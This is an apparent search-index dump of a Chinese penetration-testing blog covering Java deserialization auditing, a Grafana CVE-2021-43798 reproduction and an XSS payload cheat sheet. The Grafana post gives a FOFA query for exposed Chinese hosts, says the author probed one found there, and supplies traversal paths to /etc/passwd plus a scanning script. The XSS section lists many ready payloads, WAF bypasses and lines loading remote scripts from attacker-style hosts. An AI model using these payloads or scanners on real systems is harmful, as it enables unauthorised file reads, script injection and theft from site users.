","date":"2022-01-19","objectID":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:5:4","tags":["反序列化","代码审计"],"title":"反序列化漏洞","uri":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"代码审计 常见关键字： ObjectInputStream.readObject ObjectInputStream.readUnshared XMLDecoder.readObject Yaml.load XStream.fromXML ObjectMapper.readvalue JON.parseObject ... 简要思路 当我们搜索到关键函数或库，找到存在反序列化操作的文件时，便可以开始考虑参数是否可控，以及他们应用的CLass Path中是否包含了Apache Commons COllections等危险库(ysoseial所支持的其他库亦可)。同时满足这些条件后，我们便可以通过ysoseial生成所需的命令执行的反序列化语句。 当然，不支持Apache Commons COllectionsd等危险库，并不代表我们不能进一步利用。这种情况，我们可以通过查找其他代码中涉及的执行命令或代码的区域。通过构造利用链来达到任意代码执行的目的。 拓展 反射机制 JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。 RMI Java RMI(Java Remote Method Invocation, Java远程方法调用)是允许允许在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法、这两个虚拟机可以运行在相同计算机的不同进程中，也可以运行在网络上的不同计算机中。 在网络传输中，RMI中的对象是通过序列化方式进行编码传输的。这意味着，RMI在接收经过序列化编码的对象后会进行反序列化操作。因此可以通过RMI服务作为反序列利用链的触发点。 JNDI JNDI（Java Naming and Directory Interface， Java命令和目录接口）是一组程序接口，目的是方便查找远程或是本地对象。JNDI典型的应用场景是配置数据源，除此之外，JNDI还能访问现有的目录和服务，如LDAP,RMI,COBA,DNS,NDS,NIS等。 JNDI注入利用流程： 历史漏洞 需要个人动态调试来复现，暂未进行 Apache Commons Collections反序列化漏洞 Shiro反序列化漏洞 FastJson反序列化漏洞 weblogic反序列化漏洞 ","date":"2022-01-19","objectID":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:5:5","tags":["反序列化","代码审计"],"title":"反序列化漏洞","uri":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"漏洞修复 如果是java中使用readObject()反序列化时，首先会调用resolveClass方法读取反序列化的类名，所以我们可以通过重写ObjectInputStream对象的resolveClass方法来实现对反序列化类的校验 ","date":"2022-01-19","objectID":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:6:0","tags":["反序列化","代码审计"],"title":"反序列化漏洞","uri":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"参考 PHP反序列化漏洞 - 爪爪** - 博客园 (cnblogs.com) CTF PHP反序列化 - MustaphaMond - 博客园 (cnblogs.com) 反序列化漏洞汇总 (qq.com) Python反序列化漏洞与沙箱逃逸 - UCASZ的小站 (ucasers.cn) payload：https://github.com/sensepost/anapickle ","date":"2022-01-19","objectID":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:7:0","tags":["反序列化","代码审计"],"title":"反序列化漏洞","uri":"/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"漏洞描述 Grafana是一个跨平台、开源的数据可视化网络应用程序平台。用户配置连接的数据源之后，Grafana可以在网络浏览器里显示数据图表和警告。 Grafana 存在未授权任意文件读取漏洞，攻击者在未经身份验证的情况下可通过该漏洞读取主机上的任意文件。 ","date":"2022-01-18","objectID":"/cve-2021-43798grafana-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["Grafana","漏洞复现"],"title":"CVE-2021-43798（Grafana 未授权任意文件读取漏洞）","uri":"/cve-2021-43798grafana-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"影响范围 经测试，目前最新版本（Grafana v8.2.6）仍存在漏洞。 ","date":"2022-01-18","objectID":"/cve-2021-43798grafana-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":["Grafana","漏洞复现"],"title":"CVE-2021-43798（Grafana 未授权任意文件读取漏洞）","uri":"/cve-2021-43798grafana-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"漏洞成因 主要是插件原因，查看代码是插件目录直接和requestedFile进行合并，没有进行过滤 参考这篇文章：https://mp.weixin.qq.com/s/dqJ3F_fStlj78S0qhQ3Ggw ","date":"2022-01-18","objectID":"/cve-2021-43798grafana-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":["Grafana","漏洞复现"],"title":"CVE-2021-43798（Grafana 未授权任意文件读取漏洞）","uri":"/cve-2021-43798grafana-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"漏洞复现 ","date":"2022-01-18","objectID":"/cve-2021-43798grafana-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":["Grafana","漏洞复现"],"title":"CVE-2021-43798（Grafana 未授权任意文件读取漏洞）","uri":"/cve-2021-43798grafana-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"FOFA 查询 app=\"Grafana\" \u0026\u0026 country=\"CN\" \u0026\u0026 body=\"v8.\" 在fofa上面找的一个ip进行测试，只需要简单抓包，将路径改掉，就可以读取文件内容： ","date":"2022-01-18","objectID":"/cve-2021-43798grafana-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:1","tags":["Grafana","漏洞复现"],"title":"CVE-2021-43798（Grafana 未授权任意文件读取漏洞）","uri":"/cve-2021-43798grafana-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Fuzz些插件列表 /public/plugins/alertGroups/../../../../../../../../etc/passwd /public/plugins/alertlist/../../../../../../../../etc/passwd /public/plugins/alertmanager/../../../../../../../../etc/passwd /public/plugins/annolist/../../../../../../../../etc/passwd /public/plugins/barchart/../../../../../../../../etc/passwd /public/plugins/bargauge/../../../../../../../../etc/passwd /public/plugins/canvas/../../../../../../../../etc/passwd /public/plugins/cloudwatch/../../../../../../../../etc/passwd /public/plugins/dashboard/../../../../../../../../etc/passwd /public/plugins/dashlist/../../../../../../../../etc/passwd /public/plugins/debug/../../../../../../../../etc/passwd /public/plugins/elasticsearch/../../../../../../../../etc/passwd /public/plugins/gauge/../../../../../../../../etc/passwd /public/plugins/geomap/../../../../../../../../etc/passwd /public/plugins/gettingstarted/../../../../../../../../etc/passwd /public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd /public/plugins/grafana/../../../../../../../../etc/passwd /public/plugins/graph/../../../../../../../../etc/passwd /public/plugins/graphite/../../../../../../../../etc/passwd /public/plugins/heatmap/../../../../../../../../etc/passwd /public/plugins/histogram/../../../../../../../../etc/passwd /public/plugins/influxdb/../../../../../../../../etc/passwd /public/plugins/jaeger/../../../../../../../../etc/passwd /public/plugins/live/../../../../../../../../etc/passwd /public/plugins/logs/../../../../../../../../etc/passwd /public/plugins/loki/../../../../../../../../etc/passwd /public/plugins/mixed/../../../../../../../../etc/passwd /public/plugins/mssql/../../../../../../../../etc/passwd /public/plugins/mysql/../../../../../../../../etc/passwd /public/plugins/news/../../../../../../../../etc/passwd /public/plugins/nodeGraph/../../../../../../../../etc/passwd /public/plugins/opentsdb/../../../../../../../../etc/passwd /public/plugins/piechart/../../../../../../../../etc/passwd /public/plugins/pluginlist/../../../../../../../../etc/passwd /public/plugins/postgres/../../../../../../../../etc/passwd /public/plugins/prometheus/../../../../../../../../etc/passwd /public/plugins/stat/../../../../../../../../etc/passwd /public/plugins/state-timeline/../../../../../../../../etc/passwd /public/plugins/status-history/../../../../../../../../etc/passwd /public/plugins/table-old/../../../../../../../../etc/passwd /public/plugins/table/../../../../../../../../etc/passwd /public/plugins/tempo/../../../../../../../../etc/passwd /public/plugins/testdata/../../../../../../../../etc/passwd /public/plugins/text/../../../../../../../../etc/passwd /public/plugins/timeseries/../../../../../../../../etc/passwd /public/plugins/welcome/../../../../../../../../etc/passwd /public/plugins/xychart/../../../../../../../../etc/passwd /public/plugins/zipkin/../../../../../../../../etc/passwd alertmanager grafana loki postgres grafana-azure-monitor-datasource mixed prometheus cloudwatch graphite mssql tempo dashboard influxdb mysql testdata elasticsearch jaeger opentsdb zipkin alertGroups bargauge debug graph live piechart status-history timeseries alertlist candlestick gauge heatmap logs pluginlist table welcome annolist canvas geomap histogram news stat table-old xychart barchart dashlist gettingstarted icon nodeGraph state-timeline text ","date":"2022-01-18","objectID":"/cve-2021-43798grafana-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:2","tags":["Grafana","漏洞复现"],"title":"CVE-2021-43798（Grafana 未授权任意文件读取漏洞）","uri":"/cve-2021-43798grafana-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"脚本 import requests import sys args = str(sys.argv[1]) headers = { \"User-Agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0\", } with open(\"./paload.txt\", \"r+\") as f: # paload存放的插件名 for line in f: url = \"http://\"+args+\"/public/plugins/\"+str.rstrip(line)+\"/../../../../../../../../../../../etc/passwd\" req = requests.post(url, headers=headers,timeout=(3,7),allow_redirects=False) a=req.text str1='root' if a in str1: print('确认存在'+str.rstrip(line)+'路径,并存在漏洞!') print(url) else: print('不存在漏洞!') 脚本改进：多线程+批量url检测 ","date":"2022-01-18","objectID":"/cve-2021-43798grafana-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:3","tags":["Grafana","漏洞复现"],"title":"CVE-2021-43798（Grafana 未授权任意文件读取漏洞）","uri":"/cve-2021-43798grafana-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"漏洞分析 暂未进行 参考：https://mp.weixin.qq.com/s/dqJ3F_fStlj78S0qhQ3Ggw ","date":"2022-01-18","objectID":"/cve-2021-43798grafana-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:5:0","tags":["Grafana","漏洞复现"],"title":"CVE-2021-43798（Grafana 未授权任意文件读取漏洞）","uri":"/cve-2021-43798grafana-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"修复建议 请关注厂商主页更新：Grafana: The open observability platform | Grafana Labs 临时修复建议： 1、通过防火墙等安全设备设置访问策略，设置白名单访问。 2、如非必要，禁止公网访问该系统。 ","date":"2022-01-18","objectID":"/cve-2021-43798grafana-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:6:0","tags":["Grafana","漏洞复现"],"title":"CVE-2021-43798（Grafana 未授权任意文件读取漏洞）","uri":"/cve-2021-43798grafana-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":" 由于时间和篇幅，只做浅析，往后时间充裕了再细细研究 ","date":"2022-01-18","objectID":"/xss%E6%BC%8F%E6%B4%9E/:0:0","tags":["XSS","渗透测试","Web安全"],"title":"XSS漏洞","uri":"/xss%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"简介 XSS（cross site scripting）跨站脚本为了不与网页中层叠样式表（css）混淆，故命名为xss。黑客将恶意代码嵌入网页中，当客户网文网页的时候，网页中的脚本会自动执行，从而达成黑客攻击的目的。 ","date":"2022-01-18","objectID":"/xss%E6%BC%8F%E6%B4%9E/:1:0","tags":["XSS","渗透测试","Web安全"],"title":"XSS漏洞","uri":"/xss%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"分类 ","date":"2022-01-18","objectID":"/xss%E6%BC%8F%E6%B4%9E/:2:0","tags":["XSS","渗透测试","Web安全"],"title":"XSS漏洞","uri":"/xss%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"1.反射型xss 非持久化，一般需要欺骗客户去点击构造好的链接才能触发代码。 ","date":"2022-01-18","objectID":"/xss%E6%BC%8F%E6%B4%9E/:2:1","tags":["XSS","渗透测试","Web安全"],"title":"XSS漏洞","uri":"/xss%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"2.存储型XSS 他会存储到数据库中，这种xss漏洞危害极大，因为它可以长久的保存在网页中，每个浏览过此网页的用户都会中招，很多xss蠕虫的爆发都是基于持久型xss，一般在留言板，评论区类位置容易出现此漏洞。但存储型XSS不用考虑绕过浏览器的过滤问题，屏蔽性也要好很多。 ","date":"2022-01-18","objectID":"/xss%E6%BC%8F%E6%B4%9E/:2:2","tags":["XSS","渗透测试","Web安全"],"title":"XSS漏洞","uri":"/xss%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"3.DOM型XSS 全称Document Object Model，使用DOM可以使程序和脚本能够动态访问更新文档的内容，结构及样式。 DOM型XSS是一种特殊类型的反射型XSS，基于DOM文档对象模型的一种漏洞。 ","date":"2022-01-18","objectID":"/xss%E6%BC%8F%E6%B4%9E/:2:3","tags":["XSS","渗透测试","Web安全"],"title":"XSS漏洞","uri":"/xss%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"挖掘 XSS可以插在哪里？ 用户输入作为script标签内容 //\u003cscript\u003e标签：script是最有直接的xss攻击载荷，脚本标记可以应用外部的js代码，或者将脚本插入网页之中。 \u003cscript\u003ealert(\"hhh\")\u003c/script\u003e \u003cscript src=\"http://1.1.1.1/a.js\"\u003e\u003c/script\u003e 用户输入作为HTML注释内容 用户输入作为HTML标签的属性名 用户输入作为HTML标签的属性值 //\u003cimg \u003e标签： \u003cimg src=\"2\" onerror=alert('hhh')\u003e \u003cimg src=\"2\" onerror=alert(/hhh/)\u003e \u003cimg src=\"javascript:alert(\"XSS\");\"\u003e \u003cimg dynsrc=\"javascript:alert('XSS')\"\u003e \u003cimg lowsrc=\"javascript:alert('XSS')\"\u003e //\u003ctable\u003e标签： \u003ctable background=\"javascript::alert('hhh')\"\u003e //\u003ciframe\u003e标签：\u003ciframe\u003e标签允许另一个HTML网页的嵌入到父页面。IFrame可以包含JavaScript，但是，请注意，由于浏览器的内容安全策略（CSP），iFrame中的JavaScript无法访问父页面的DOM。然而，IFrame仍然是非常有效的解除网络钓鱼攻击的手段。 \u003ciframe src=”http://evil.com/xss.html”\u003e 用户输入作为HTML标签的名字 直接插入到CSS里　","date":"2022-01-18","objectID":"/xss%E6%BC%8F%E6%B4%9E/:3:0","tags":["XSS","渗透测试","Web安全"],"title":"XSS漏洞","uri":"/xss%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"测试思路 下面让我们来看一下XSS绕过的测试流程。 现实中，大多数的场所是用的黑名单来做XSS过滤器的，有三种方式绕过黑名单的测试： 1.暴力测试（输入大量的payload，看返回结果） 2.根据正则推算 3.利用浏览器bug 初步测试 （1）尝试插入比较正常的HTML标签，例如：\u003ca\u003e、\u003cb\u003e、\u003ci\u003e、\u003cu\u003e等，来看一下返回页面的情况是怎样的，是否被HTML编码了，或者标签被过滤了。 （2）尝试插入不闭合的标签，例如：\u003ca、\u003cb、i\u003e、u\u003e、\u003cimg等，然后看一下返回响应，是否对开放的标签也有过滤。 （3）然后测试几种常见的XSS向量： \u003cscript\u003ealert(1)\u003c/script\u003e\u003cscript\u003eprompt(1)\u003c/script\u003e\u003cscript\u003econfirm(1)\u003c/script\u003e......看返回响应，是过滤的全部，还是只过滤了部分，是否还留下了alert、prompt、confirm等字符，再尝试大小写的组合： \u003cscRiPt\u003ealert(1);\u003c/scrIPt\u003e （4）如果过滤器仅仅是把\u003cscript\u003e和\u003c/script\u003e标签过滤掉，那么可以用双写的方式来绕过： \u003cscr\u003cscript\u003eipt\u003ealert(1)\u003c/scr\u003cscript\u003eipt\u003e 这样当","date":"2022-01-18","objectID":"/xss%E6%BC%8F%E6%B4%9E/:3:1","tags":["XSS","渗透测试","Web安全"],"title":"XSS漏洞","uri":"/xss%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"常用Payload #Basic payload \u003cscript\u003ealert('XSS')\u003c/script\u003e \u003cscr\u003cscript\u003eipt\u003ealert('XSS')\u003c/scr\u003cscript\u003eipt\u003e \"\u003e\u003cscript\u003ealert('XSS')\u003c/script\u003e \"\u003e\u003cscript\u003ealert(String.fromCharCode(88,83,83))\u003c/script\u003e #Img payload \u003cimg src=x onerror=alert('XSS');\u003e \u003cimg src=x onerror=alert('XSS')// \u003cimg src=x onerror=alert(String.fromCharCode(88,83,83));\u003e \u003cimg src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));\u003e \u003cimg src=x:alert(alt) onerror=eval(src) alt=xss\u003e \"\u003e\u003cimg src=x onerror=alert('XSS');\u003e \"\u003e\u003cimg src=x onerror=alert(String.fromCharCode(88,83,83));\u003e #Svg payload \u003csvgonload=alert(1)\u003e \u003csvg/onload=alert('XSS')\u003e \u003csvg onload=alert(1)// \u003csvg/onload=alert(String.fromCharCode(88,83,83))\u003e \u003csvg id=alert(1) onload=eval(id)\u003e \"\u003e\u003csvg/onload=alert(String.fromCharCode(88,83,83))\u003e \"\u003e\u003csvg/onload=alert(/XSS/) #HTML5中的一些XSS \u003cbody onload=alert(/XSS/.source)\u003e \u003cinput autofocus onfocus=alert(1)\u003e \u003cselect autofocus onfocus=alert(1)\u003e \u003ctextarea autofocus onfocus=alert(1)\u003e \u003ckeygen autofocus onfocus=alert(1)\u003e \u003cvideo/poster/onerror=alert(1)\u003e \u003cvideo\u003e\u003csource onerror=\"javascript:alert(1)\"\u003e \u003cvideo src=_ onloadstart=\"alert(1)\"\u003e \u003cdetails/open/ontoggle=\"alert`1`\"\u003e \u003caudio src onloadstart=alert(1)\u003e \u003cmarquee onstart=alert(1)\u003e \u003cmeter value=2 min=0 max=10 onmouseover=alert(1)\u003e2 out of 10\u003c/meter\u003e \u003cbody ontouchstart=alert(1)\u003e // 当手指触摸屏幕时触发 \u003cbody ontouchend=alert(1)\u003e // 当手指从屏幕中移走时触发 \u003cbody ontouchmove=alert(1)\u003e // 当手指在屏幕中拖动时触发XSS使用Script标签（外部Payload） scirpt标签用于定义客户端脚本，比如JavaScript \u003cscript\u003ealert(1);\u003c/script\u003e \u003cscript\u003ealert(\"xss\");\u003c/script\u003e img标签定义HTML页面中的图像 \u003cimg src=1onerror=alert(1);\u003e \u003cimg src=1onerror=alert(\"xss\");\u003e input标签规定了用户可以在其中输入数据的输入字段 \u003cinput onfocus=alert(1);\u003e onfocus=\"alert(1);\"autofocus\u003e details标签通过提供用户开启关闭的交互式控件，规定了用户可见的或者隐藏的需求的补充细节。ontoggle事件规定了在用户打开或关闭元素时触发： \u003cdetails ontoggle=alert(1);\u003e \u003cdetails openontoggle=alert(1);\u003e svg标签用来在HTML页面中直接嵌入SVG文件的代码 \u003csvg onload=alert(1);\u003e select标签用来创建下拉列表 \u003cselect onfocus=alert(1)\u003e\u003c/select\u003e \u003cselect onfocus=alert(1)autofocus\u003e iframe标签创建包含另外一个文档的内联框架 \u003ciframe onload=alert(1);\u003e\u003c/iframe\u003e video标签定义视频，比如电影片段或其他视频流。 \u003cvideo\u003e\u003csource onerror=alert(1)\u003e audio标签定义声音，比如音乐或其他音频流。 \u003caudio src=xonerror=alert(1);\u003e body标签定义文档的主体 \u003cbody onload=alert(1);\u003e onscroll事件在元素滚动条在滚动时触发。我们可以利用换行符以及autofocus，当用户滑动滚动条的时候自动触发，无需用户去点击触发： \u003cbody onscroll=alert(1);\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cinputautofocus\u003e textarea标签定义一个多行的文本输入控件。 \u003ctextarea onfocus=alert(1);autofocus\u003e marquee标签 \u003cmarquee onstart=alert(1)\u003e\u003c/marquee\u003e//Chrome不行，火狐和IE都可以 isindex标签 \u003cisindex type=image src=1onerror=alert(1)\u003e//仅限于IE 利用link远程包含JavaScript文件 标签定义文档与外部资源的关系。在无CSP的情况下才可以使用： \u003clink rel=import href=\"http://47.xxx.xxx.72/evil.js\"\u003e 利用JavaScript伪协议 javascript:这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。当浏览器装载了这样的URL时，并不会转向某个URL，而是执行这个URL中包含的javascript代码，并把最后一条javascript语句的字符串值作为新文档的内容显示出来。 a标签 \u003ca href=\"javascript:alert(1);\"\u003exss\u003c/a\u003e iframe标签 \u003ciframe src=javascript:alert(1);\u003e\u003c/iframe\u003e img标签 \u003cimg src=xonerror=alert(1)\u003e \u003cimg src=javascript:alert(1)\u003e//IE7以下 form标签 \u003cform action=\"Javascript:alert(1)\"\u003e\u003cinput type=submit\u003e ","date":"2022-01-18","objectID":"/xss%E6%BC%8F%E6%B4%9E/:3:2","tags":["XSS","渗透测试","Web安全"],"title":"XSS漏洞","uri":"/xss%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"常见编码 1.js编码 js提供了四种字符编码的策略 三位八进制数字，如果个数不够，在前面补0，例如\"e\"的编码为\"\\145\" 两位十六进制数字，如果个数不够，在前面补0，例如\"e\"的编码为\"\\x65\" 四位十六进制数字，如果个数不够，在前面补0，例如\"e\"的编码为\"\\u0065\" 对于一些控制字符，使用特殊的C类型的转义风格(例如\\n和\\r) 2.html实体编码 命名实体：以\u0026开头，以分号结尾 字符编码：十进制，十六进制ASCII码或者Unicode字符编码 2.url编码 使用XSS编码测试时需要考虑html渲染的顺序，针对多种编码的组合时，要选择合适的编码进行测试 ","date":"2022-01-18","objectID":"/xss%E6%BC%8F%E6%B4%9E/:3:3","tags":["XSS","渗透测试","Web安全"],"title":"XSS漏洞","uri":"/xss%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"常见bypass 可以参考法克论坛的pdf 过滤的绕过 大小写绕过 - 绕过标签黑名单 - 用代码评估绕过单词黑名单 - 不完整的HTML标签绕过 - 绕过字符串的引号 - 绕过Script标签的引号 - 在mousedown事件中绕过引号 - 绕过点（.）的限制 - 绕过字符串的括号 - 绕过括号和分号 - 绕过 onxxxx= 黑名单 - 绕过空格过滤 - Bypass email filter - 绕过文档黑名单 - 在字符串中使用javascript绕过 - 使用其他方式绕过重定向限制 - 使用其他方式执行alert - 不使用任何东西绕过 \"\u003e\" - 使用其他字符绕过 \";\" - 使用HTML编码绕过 - 使用Katana绕过 - 使用Lontara绕过 - 使用ECMAScript6绕过 - 使用八进制编码绕过 - 使用Unicode编码绕过 - 使用UTF-7编码绕过 - 使用UTF-8编码绕过 - 使用UTF-16be编码绕过 - 使用UTF-32编码绕过 - 使用BOM（浏览器对象模型）绕过 - 使用奇怪的编码绕过 过狗 发现了个好资源，直接借鉴的，推荐去学学 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection Cloudflare XSS Bypasses 25st January 2021 \u003csvg/onrandom=random onload=confirm(1)\u003e \u003cvideo onnull=null onmouseover=confirm(1)\u003e 21st April 2020 \u003csvg/OnLoad=\"`${prompt``}`\"\u003e 22nd August 2019 \u003csvg/onload=%26nbsp;alert`bohdan`+ 5th June 2019 1'\"\u003e\u003cimg/src/onerror=.1|alert``\u003e 3rd June 2019 \u003csvg onload=prompt%26%230000000040document.domain)\u003e \u003csvg onload=prompt%26%23x000000028;document.domain)\u003e xss'\"\u003e\u003ciframe srcdoc='%26lt;script\u003e;prompt`${document.domain}`%26lt;/script\u003e'\u003e Cloudflare XSS Bypass - 22nd March 2019 (by @RakeshMane10) \u003csvg/onload=\u0026#97\u0026#108\u0026#101\u0026#114\u0026#00116\u0026#40\u0026#41\u0026#x2f\u0026#x2f Cloudflare XSS Bypass - 27th February 2018 \u003ca href=\"j\u0026Tab;a\u0026Tab;v\u0026Tab;asc\u0026NewLine;ri\u0026Tab;pt\u0026colon;\u0026lpar;a\u0026Tab;l\u0026Tab;e\u0026Tab;r\u0026Tab;t\u0026Tab;(document.domain)\u0026rpar;\"\u003eX\u003c/a\u003e Chrome Auditor - 9th August 2018 \u003c/script\u003e\u003csvg\u003e\u003cscript\u003ealert(1)-%26apos%3B Live example by @brutelogic - https://brutelogic.com.br/xss.php Incapsula WAF Bypass by @Alra3ees- 8th March 2018 anythinglr00\u003c/script\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003euxldz anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz Incapsula WAF Bypass by @c0d3G33k - 11th September 2018 \u003cobject data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='\u003e\u003c/object\u003e Incapsula WAF Bypass by @daveysec - 11th May 2019 \u003csvg onload\\r\\n=$.globalEval(\"al\"+\"ert()\");\u003e Akamai WAF Bypass by @zseano - 18th June 2018 ?\"\u003e\u003c/script\u003e\u003cbase%20c%3D=href%3Dhttps:\\mysite\u003e Akamai WAF Bypass by @s0md3v - 28th October 2018 \u003cdETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x\u003e WordFence WAF Bypass by @brutelogic - 12th September 2018 \u003ca href=javas\u0026#99;ript:alert(1)\u003e Fortiweb WAF Bypass by @rezaduty - 9th July 2019 \\u003e\\u003c\\u0068\\u0031 onclick=alert('1')\\u003e ","date":"2022-01-18","objectID":"/xss%E6%BC%8F%E6%B4%9E/:3:4","tags":["XSS","渗透测试","Web安全"],"title":"XSS漏洞","uri":"/xss%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"练习平台 靶场：xss-labs ","date":"2022-01-18","objectID":"/xss%E6%BC%8F%E6%B4%9E/:3:5","tags":["XSS","渗透测试","Web安全"],"title":"XSS漏洞","uri":"/xss%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"工具 xss平台 beef ","date":"2022-01-18","objectID":"/xss%E6%BC%8F%E6%B4%9E/:3:6","tags":["XSS","渗透测试","Web安全"],"title":"XSS漏洞","uri":"/xss%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Java代码审计 一种审计策略： 1.收集输入、输出点 2.查看输入、输出点的上下文环境 3.判断Web应用是否对输入、输出环境做了防御工作 ","date":"2022-01-18","objectID":"/xss%E6%BC%8F%E6%B4%9E/:4:0","tags":["XSS","渗透测试","Web安全"],"title":"XSS漏洞","uri":"/xss%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"XSS常见触发位置 